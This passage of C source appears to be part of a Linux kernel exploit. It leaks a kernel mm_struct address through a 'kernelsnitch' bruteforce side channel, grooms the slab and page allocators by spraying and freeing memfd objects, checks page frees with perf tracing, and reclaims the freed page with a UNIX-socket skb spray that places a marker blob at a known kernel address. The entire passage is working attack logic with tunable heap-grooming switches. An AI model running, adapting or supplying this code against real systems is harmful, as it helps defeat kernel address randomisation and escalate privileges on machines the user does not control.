            for (unsigned long round = 0; round < drain_rounds; ++round) {
                for (size_t i = 0; i < objs_per_slab; ++i) {
                    int fd = clone_memfd();
                    close(fd);
                    drained++;
                }
            }
            if (drain_rounds)
                printf("PAGE_LEAK_DRAIN_ALLOC rounds=%lu refs=%zu\n",
                       drain_rounds, drained);
        }
        if (skb_reclaim) {
            if (brute_before_skb) {
                size_t prep_left = prep.count;
                size_t spray_left = spray.count;

                kernelsnitch_bruteforce(ks);
                leaked = ks->mm_struct;
                if (leaked == (uintptr_t)-1) {
                    fprintf(stderr, "PAGE_LEAK_MM_FAIL_BEFORE_SKB\n");
                    return 3;
                }
                base = leaked & ~(ORDER3_SIZE - 1);
                payload = (uintptr_t)base;
                printf("PAGE_LEAK_INITIAL_KS_CANDIDATE mm=0x%016zx base=0x%016zx zone=%s payload=0x%016zx t_ms=%" PRIu64 "\n",
                       leaked, base,
                       controlled_mm_zone_name(controlled_mm_zone(base)),
                       payload, elapsed_ms());
                print_ks_details(ks, leaked);
                pin_to_core(0);
                close_ctx(&prep);
                close_ctx(&spray);
                printf("PAGE_LEAK_FREE_ALL_BEFORE_SKB prep=%zu spray=%zu "
                       "t_ms=%" PRIu64 "\n",
                       prep_left, spray_left, elapsed_ms());
                if (getenv("PAGE_LEAK_FLUSH_TARGET_ALLOC") && perf_ready) {
                    perf_capture_stop(&perf);
                    perf_ready = perf_capture_start_kmem(&perf);
                    if (!perf_ready)
                        return 5;
                    printf("PAGE_CALIBRATION_PERF_TARGET_START base=0x%016zx\n",
                           base);
                }
                {
                    unsigned long pages = env_ulong(
                        "PAGE_LEAK_FLUSH_ALLOC_PAGES", 0);
                    if (pages) {
                        int reverse = getenv(
                            "PAGE_LEAK_FLUSH_ALLOC_REVERSE") != NULL;
                        size_t refs = flush_alloc_batch(
                            pages, objs_per_slab, reverse);
                        printf("PAGE_LEAK_FLUSH_ALLOC pages=%lu refs=%zu reverse=%d\n",
                               pages, refs, reverse);
                    }
                    if (getenv("PAGE_LEAK_FLUSH_ROTATE_DUMMY")) {
                        if (getenv("PAGE_LEAK_NO_PERF_GROUP_TARGET") &&
                            (no_perf || group_calibrate)) {
                            if (getenv("PAGE_LEAK_NO_PERF_FAST_KS")) {
                                setenv("KSNITCH_APPENDED", "256", 1);
                                printf("PAGE_LEAK_NO_PERF_FAST_KS first_collisions=4 hint_collisions=2 appended=256\n");
                            }
                            unsigned long max_refs = env_ulong(
                                "PAGE_LEAK_NO_PERF_GROUP_MAX", 128);
                            uintptr_t group_base = 0;
                            int *group_fds = calloc(objs_per_slab,
                                                    sizeof(*group_fds));
                            if (!group_fds)
                                die("calloc no-perf target fds");
                            int ok = collect_no_perf_full_group(
                                objs_per_slab, max_refs,
                                (size_t)cpu_count, &group_base, group_fds);
                            printf("PAGE_LEAK_NO_PERF_GROUP_TARGET ok=%d max=%lu base=0x%016zx zone=%s t_ms=%" PRIu64 "\n",
                                   ok, max_refs, group_base,
                                   controlled_mm_zone_name(
                                       controlled_mm_zone(group_base)),
                                   elapsed_ms());
                            if (!ok) {
                                free(group_fds);
                                return 4;
                            }
                            base = group_base;
                            payload = (uintptr_t)base;
                            printf("PAGE_LEAK_NO_PERF_GROUP_SELECTED base=0x%016zx zone=%s payload=0x%016zx t_ms=%" PRIu64 "\n",
                                   base,
                                   controlled_mm_zone_name(
                                       controlled_mm_zone(base)),
                                   payload, elapsed_ms());
                            if (getenv("PAGE_LEAK_NO_PERF_TARGET_DRY")) {
                                for (size_t i = 0; i < objs_per_slab; ++i)
                                    if (group_fds[i] >= 0)
                                        check_int(close(group_fds[i]),
                                                  "close dry no-perf group");
                                free(group_fds);
                                return 0;
                            }
                            if (group_calibrate && perf_ready) {
                                perf_capture_stop(&perf);
                                perf_ready = perf_capture_start(&perf);
                                if (!perf_ready)
                                    return 5;
                                printf("PAGE_CALIBRATION_NO_PERF_DRAIN_START base=0x%016zx\n",
                                       group_base);
                            }
                            pin_to_core(0);
                            printf("PAGE_LEAK_NO_PERF_DRAIN_CPU cpu=%d\n",
                                   sched_getcpu());
                            if (!drain_no_perf_group(group_fds,
                                                     objs_per_slab)) {
                                for (size_t i = 0; i < objs_per_slab; ++i)
                                    if (group_fds[i] >= 0)
                                        check_int(close(group_fds[i]),
                                                  "close failed no-perf group");
                                free(group_fds);
                                return 4;
                            }
                            free(group_fds);
                            if (group_calibrate && perf_ready) {
                                perf_capture_stop(&perf);
                                group_free_confirmed =
                                    perf_candidate_page_free_match(&perf,
                                                                   base);
                                printf("PAGE_CALIBRATION_GROUP_PAGE_FREE confirmed=%d\n",
                                       group_free_confirmed);
                                if (!group_free_confirmed) {
                                    fprintf(stderr,
                                            "PAGE_CALIBRATION_REJECT candidate_not_page_free\n");
                                    return 4;
                                }
                                perf_ready = perf_capture_start(&perf);
                                if (!perf_ready)
                                    return 5;
                                printf("PAGE_CALIBRATION_SKB_ALLOC_START base=0x%016zx order=%d\n",
                                       base, SKB_RECLAIM_ORDER);
                            }
                            if (getenv("PAGE_LEAK_NO_PERF_GROUP_DRAIN_DRY"))
                                return 0;
                        } else if (getenv("PAGE_LEAK_NO_PERF_TARGET_ALLOC") &&
                            no_perf) {
                            unsigned long max_refs = env_ulong(
                                "PAGE_LEAK_NO_PERF_TARGET_MAX", 128);
                            int ok = flush_target_rotate_no_perf(
                                base, objs_per_slab, max_refs,
                                (size_t)cpu_count);
                            printf("PAGE_LEAK_NO_PERF_TARGET_ALLOC ok=%d max=%lu\n",
                                   ok, max_refs);
                            if (!ok)
                                return 4;
                            if (getenv("PAGE_LEAK_NO_PERF_TARGET_DRY"))
                                return 0;
                        } else if (getenv("PAGE_LEAK_FLUSH_TARGET_ALLOC") &&
                            perf_ready) {
                            unsigned long max_refs = env_ulong(
                                "PAGE_LEAK_FLUSH_TARGET_MAX", 4096);
                            int ok = flush_target_rotate(
                                &perf, base, objs_per_slab, max_refs);
                            printf("PAGE_LEAK_FLUSH_TARGET_ALLOC ok=%d max=%lu\n",
                                   ok, max_refs);
                        } else {
                            size_t refs = flush_rotate_dummy(objs_per_slab);
                            printf("PAGE_LEAK_FLUSH_ROTATE_DUMMY refs=%zu\n",
                                   refs);
                        }
                    }
                }
            }
            if (!defer_bruteforce) {
                kernelsnitch_cleanup(ks);
                ks = NULL;
                if (ks_second) {
                    kernelsnitch_cleanup(ks_second);
                    ks_second = NULL;
                }
            }
            if (getenv("PAGE_LEAK_REQUIRE_PAGE_FREE") && perf_ready &&
                !group_calibrate) {
                perf_capture_stop(&perf);
                perf_ready = 0;
                perf_candidate_match(&perf, leaked, base);
                if (!perf_candidate_page_free_match(&perf, base)) {
                    fprintf(stderr,
                            "PAGE_CALIBRATION_REJECT candidate_not_page_free\n");
                    return 4;
                }
                printf("PAGE_CALIBRATION_PAGE_FREE_GATE_OK base=0x%016zx\n",
                       base);
            }
            wait_before_skb();
            {
                unsigned long requested_sends =
                    env_ulong("PAGE_LEAK_SKB_RECLAIM_SENDS", 1);
                if (!send_blob_spray(skb_sv[0], blob, requested_sends))
                    return 4;
            }
            if (defer_bruteforce && !brute_before_skb) {
                kernelsnitch_bruteforce(ks);
                leaked = ks->mm_struct;
                if (leaked == (uintptr_t)-1) {
                    fprintf(stderr, "PAGE_LEAK_MM_FAIL_AFTER_RECLAIM\n");
                    return 3;
                }
                base = leaked & ~(ORDER3_SIZE - 1);
                payload = (uintptr_t)base;
                printf("PAGE_LEAK_CANDIDATE mm=0x%016zx base=0x%016zx payload=0x%016zx\n",
                       leaked, base, payload);
                print_ks_details(ks, leaked);
            }
            if (perf_ready && (perf_defer_stop || defer_bruteforce)) {
                int alloc_confirmed;
                int free_confirmed = group_free_confirmed;

                perf_capture_stop(&perf);
                if (getenv("PAGE_LEAK_PERF_TRIGGER_SUMMARY"))
                    perf_trigger_summary(&perf);
                alloc_confirmed = perf_candidate_match(&perf, leaked, base) &&
                    (!skb_reclaim || perf_candidate_alloc_match(&perf, base));
                if (group_calibrate)
                    printf("PAGE_CALIBRATION_GROUP_PAGE_FREE confirmed=%d\n",
                           free_confirmed);
                if (!alloc_confirmed || (group_calibrate && !free_confirmed)) {
                    fprintf(stderr,
                            "PAGE_CALIBRATION_REJECT skb_not_on_candidate\n");
                    if (!getenv("PAGE_LEAK_HOLD_ON_REJECT"))
                        return 4;
                    printf("PAGE_CALIBRATION_HOLD_REJECT alloc_confirmed=0\n");
                } else {
                    printf("PAGE_CALIBRATION_SKB_ACCEPT alloc_confirmed=1\n");
                }
            }
            printf("PAGE_LEAK_SKB_SPRAY_DONE base=0x%016zx verification=none t_ms=%" PRIu64 "\n",
                   base, elapsed_ms());
            if (defer_bruteforce) {
                kernelsnitch_cleanup(ks);
                ks = NULL;
            }
        }
        for (int i = 0; i < 4; ++i)
            sched_yield();
        printf("PAGE_LEAK_TARGET_READY initial_mm=0x%016zx selected_base=0x%016zx selected_zone=%s t_ms=%" PRIu64 "\n",
               leaked, base,
               controlled_mm_zone_name(controlled_mm_zone(base)),
               elapsed_ms());
        fflush(stdout);
        hold_probe();
        if (skb_reclaim) {
            check_int(close(skb_sv[0]), "close reclaim skb0");
            check_int(close(skb_sv[1]), "close reclaim skb1");
            free(blob);
        }
        if (ks)
            kernelsnitch_cleanup(ks);
        if (ks_second)
            kernelsnitch_cleanup(ks_second);
        close_ctx(&prep);
        close_ctx(&spray);
        close_ctx(&pre);
        close_ctx(&post);
        return 0;
    }
    fflush(stdout);
    if (!gate_candidate(base)) {
        fprintf(stderr, "PAGE_LEAK_GATE_ABORT\n");
        return 6;
    }
    printf("PAGE_LEAK_GATE_OK\n");

    blob = malloc(SKB_SEND_SIZE);
    if (!blob)
        die("malloc blob");
    memset(blob, 0x50, SKB_SEND_SIZE);
    memcpy(blob + 0x0e80, "RMG-CLEAN-PAGE", 14);
    check_int(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_sv), "socketpair pcp");
    check_int(socketpair(AF_UNIX, SOCK_STREAM, 0, skb_sv), "socketpair skb");
    send_blob(pcp_sv[0], blob);
    printf("PAGE_LEAK_PCP_SENT\n");
    pin_to_core(0);
    if (getenv("PAGE_LEAK_DRAIN_SPRAY_STRIDE")) {
        size_t drained = 0;
        for (size_t i = 0; i < spray.count; i += objs_per_slab) {
            if (spray.memfds[i] >= 0) {
                check_int(close(spray.memfds[i]), "close spray stride");
                spray.memfds[i] = -1;
                drained++;
            }
        }
        printf("PAGE_LEAK_SPRAY_STRIDE_DRAIN slabs=%zu\n", drained);
    }
    for (size_t i = 0; i < pre.count; ++i) {
        check_int(close(pre.memfds[i]), "close pre");
        pre.memfds[i] = -1;
    }
    for (size_t i = 0; i < post.count; ++i) {
        check_int(close(post.memfds[i]), "close post");
        post.memfds[i] = -1;
    }
    for (int i = 0; i < 4; ++i)
        sched_yield();
    check_int(close(pcp_sv[0]), "close pcp0");
    pcp_sv[0] = -1;
    check_int(close(pcp_sv[1]), "close pcp1");
    pcp_sv[1] = -1;
    check_int(close(leak_memfd), "close leak mem");
    leak_memfd = -1;
    if (getenv("PAGE_LEAK_DRAIN_PREP")) {
        for (size_t i = 0; i < prep.count; ++i) {
            if (prep.memfds[i] >= 0) {
                check_int(close(prep.memfds[i]), "close prep");
                prep.memfds[i] = -1;
            }
        }
    }
    unsigned long extra_sends = env_ulong("PAGE_LEAK_SKB_RECLAIM_SENDS", 1);
    if (!send_blob_spray(skb_sv[0], blob, extra_sends))
        return 4;
    printf("PAGE_LEAK_OK mm=0x%016zx base=0x%016zx payload=0x%016zx marker=0x%016zx\n",
           leaked, base, payload, base);
    printf("PAGE_LEAK_MARKER base=0x%016zx offset=0 len=14 text=RMG-CLEAN-PAGE\n",
           base);
    fflush(stdout);
    hold_probe();
    check_int(close(skb_sv[0]), "close skb0");
    check_int(close(skb_sv[1]), "close skb1");
    free(blob);
    kernelsnitch_cleanup(ks);
    if (ks_second)
        kernelsnitch_cleanup(ks_second);
    close_ctx(&prep);
    close_ctx(&spray);
    close_ctx(&pre);
    close_ctx(&post);
    return 0;
}
